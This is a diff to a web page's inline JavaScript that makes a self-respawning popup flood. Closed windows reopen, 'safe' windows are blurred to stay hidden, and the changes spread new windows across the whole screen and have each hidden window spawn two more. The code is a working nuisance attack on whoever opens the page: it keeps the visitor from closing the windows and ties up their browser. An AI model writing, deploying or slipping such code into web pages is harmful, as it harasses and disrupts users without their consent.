@@ -13,13 +13,12 @@
         window.plsclose = 'no'
         window.clone = new URLSearchParams(window.location.search).get('popup') || 'main'
         function openNew(input = 'popup') {
-            var popup = window.open(window.location.href + '?popup=' + input, '', 'top=' + (Math.floor(Math.random() * 900) + 100) + ',left=' + (Math.floor(Math.random() * 900) + 100) + ',width=350,height=250');
+            var popup = window.open(window.location.href + '?popup=' + input, '', 'top=' + Math.floor(Math.random() * screen.availHeight) + ',left=' + Math.floor(Math.random() * screen.availWidth) + ',width=350,height=250');
             if(input === 'safe') { popup.blur(); }
             var popupTick = setInterval(function () {
                 if (popup.closed) {
                     clearInterval(popupTick);
                     if (window.plsclose == "no") {
-                        openNew()
                         openNew('safe')
                     }
                 }
@@ -29,9 +28,9 @@
         }
 
         if (window.clone === 'main') {
-            openNew()
             openNew('safe')
         } else if (window.clone === 'safe') {
+            openNew()
             openNew()
         }
     </script>
